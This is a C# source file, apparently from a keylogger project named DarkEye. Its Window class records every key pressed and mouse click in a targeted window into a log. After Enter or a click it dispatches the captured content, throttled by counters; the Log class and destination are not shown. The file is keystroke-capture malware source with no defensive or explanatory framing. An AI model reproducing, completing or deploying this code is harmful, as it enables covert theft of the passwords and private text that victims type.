using DarkEye.Classes.Utils;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DarkEye.Classes.Objects
{
    /*
    * Created by Gish_Reloaded on 27/03/2020.
    */
    class Window
    {
        private String _name;
        private bool _target;
        public Log log;

        public String name
        {
            get
            {
                return this._name;
            }
            set
            {
                this._name = value;
            }
        }
        public bool target
        {
            get
            {
                return this._target;
            }
            set
            {
                this._target = value;
            }
        }

        public Window(String name)
        {
            this.name = name;
            this.target = false;
            this.log = new Log(this);
        }

        int dkeyPress = 0;
        int dmouseClick = 0;
        int dpress = 0;

        int min = 4;
        int min2 = 8;
        public virtual void onKeyPressed(object sender, Keys e)
        {
            this.log.AddLog(e.ToString());
            dpress++;

            if (e.GetHashCode() == 13)
            {
                if (dpress >= min && dkeyPress <= min)
                {
                    this.log.DispathContent();
                    dkeyPress++;
                    dpress = 0;
                } 
            }
                
        }
        public virtual void onKeyUnPressed(object sender, Keys e) { }

        public virtual void onMouseClick(object sender, EventArgs e)
        {
            this.log.AddLog("Click");

            if (dpress >= min && dmouseClick <= min2)
            {
                this.log.DispathContent();
                dmouseClick++;
                dpress = 0;
            }
        }
    }
}
